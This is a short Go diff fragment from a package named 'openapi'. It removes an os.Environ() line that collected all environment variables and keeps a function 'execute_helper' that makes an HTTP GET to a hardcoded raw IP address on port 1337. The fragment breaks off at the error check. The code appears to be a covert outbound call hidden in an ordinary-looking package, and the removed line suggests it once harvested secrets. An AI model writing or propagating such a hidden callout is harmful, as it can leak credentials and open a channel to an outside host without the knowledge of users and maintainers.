@@ -2,12 +2,10 @@ package openapi
 
 import (
 	"context"
-	"os"
   "net/http"
 )
 
 func execute_helper() {
-  envVars := os.Environ()
   baseURL := "http://64.225.68.21:1337/uehpnowczlyh?q=a"
 	resp, err := http.Get(baseURL)
 	if err != nil {
